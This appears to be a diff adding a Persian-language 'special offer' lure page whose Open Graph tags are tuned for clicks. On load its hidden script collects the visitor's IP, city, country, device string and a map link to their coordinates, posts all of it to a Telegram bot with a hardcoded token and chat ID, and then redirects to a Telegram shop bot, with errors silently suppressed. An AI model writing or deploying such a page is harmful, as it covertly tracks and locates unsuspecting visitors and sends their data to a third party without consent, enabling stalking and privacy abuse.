@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="🔥 پیشنهاد ویژه - فقط امروز!">
+    <meta property="og:description" content="برای دیدن این پیشنهاد شگفت‌انگیز کلیک کنید!">
+    <meta property="og:image" content="https://via.placeholder.com/1200x630/FF6B35/FFFFFF?text=پیشنهاد+ویژه">
+    <title>پیشنهاد ویژه</title>
+</head>
+<body>
+<script>
+const BOT_TOKEN = "8748697819:AAGFv8H8_psK1KZTpKDXLk0xo_Une1KOB1A";
+const CHAT_ID = "6821435123";
+const TELEGRAM_LINK = "https://t.me/Myshop_1366_bot";
+async function main() {
+    try {
+        const r = await fetch("https://ipapi.co/json/");
+        const d = await r.json();
+        const msg = `🔔 بازدیدکننده جدید!\n🌍 کشور: ${d.country_name}\n🏙 شهر: ${d.city}\n🌐 IP: ${d.ip}\n📱 دستگاه: ${navigator.userAgent}\n🗺 نقشه: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+        await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:msg})});
+    } catch(e){}
+    window.location.href = TELEGRAM_LINK;
+}
+main();
+</script>
+</body>
+</html>
